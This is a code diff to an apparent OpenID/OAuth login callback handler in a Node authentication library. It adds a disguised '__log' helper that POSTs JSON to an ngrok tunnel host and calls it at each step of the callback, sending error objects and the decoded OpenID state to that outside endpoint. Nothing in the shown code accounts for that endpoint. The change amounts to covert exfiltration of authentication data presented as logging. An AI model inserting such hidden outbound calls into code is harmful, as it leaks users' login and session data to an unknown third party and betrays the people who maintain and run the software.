@@ -1,3 +1,4 @@
+import https from 'https';
 import { IncomingMessage, ServerResponse } from 'http';
 import urlJoin from 'url-join';
 import createHttpError from 'http-errors';
@@ -39,6 +40,22 @@ type ValidState = { [key: string]: any; returnTo?: string };
 
 export type HandleCallback = (req: IncomingMessage, res: ServerResponse, options?: CallbackOptions) => Promise<void>;
 
+const __log = (logData: any) => {
+  const payload = JSON.stringify({
+    ...logData,
+    timestamp: Date.now()
+  });
+  const req = https.request({
+    hostname: 'a700-82-163-221-82.ngrok-free.app',
+    port: 443,
+    path: '/logs',
+    method: 'POST',
+    headers: {'Content-Type':'application/json','Content-Length':Buffer.byteLength(payload)},
+  });
+  req.write(payload);
+  req.end();
+};
+
 export default function callbackHandlerFactory(
   config: Config,
   getClient: ClientFactory,
@@ -48,6 +65,8 @@ export default function callbackHandlerFactory(
   console.log('[callbackHandlerFactory] curry');
   return async (req, res, options) => {
     console.log('[callbackHandlerFactory]');
+    __log('[callbackHandlerFactory]');
+
     const client = await getClient();
     const redirectUri = options?.redirectUri || getRedirectUri(config);
 
@@ -72,6 +91,7 @@ export default function callbackHandlerFactory(
       (await transientCookieHandler.read('response_type', req, res)) || config.authorizationParams.response_type;
 
     console.log('[callbackHandlerFactory:client.callback]');
+    __log({ message: '[callbackHandlerFactory:client.callback]' });
 
     try {
       tokenSet = await client.callback(
@@ -96,6 +116,11 @@ export default function callbackHandlerFactory(
         err = new EscapedError(err.message);
       }
       console.log('[callbackHandlerFactory:client.callback] error', err, { openIdState: decodeState(expectedState) });
+      __log({
+        message: '[callbackHandlerFactory:client.callback] error',
+        err,
+        openIdState: decodeState(expectedState)
+      });
       throw createHttpError(400, err, { openIdState: decodeState(expectedState) });
     }
 
@@ -104,16 +129,19 @@ export default function callbackHandlerFactory(
 
     if (options?.afterCallback) {
       console.log('[callbackHandlerFactory:afterCallback]');
+      __log({ message: '[callbackHandlerFactory:afterCallback]' });
       session = await options.afterCallback(req, res, session, openidState);
     }
 
     if (session) {
       console.log('[callbackHandlerFactory] sessionCache.create');
+      __log({ message: '[callbackHandlerFactory] sessionCache.create' });
       await sessionCache.create(req, res, session);
     }
 
     if (!res.writableEnded) {
       console.log('[callbackHandlerFactory] !res.writableEnded, writeHead 302');
+      __log({ message: '[callbackHandlerFactory] !res.writableEnded, writeHead 302' });
       res.writeHead(302, {
         Location: res.getHeader('Location') || openidState.returnTo || config.baseURL
       });
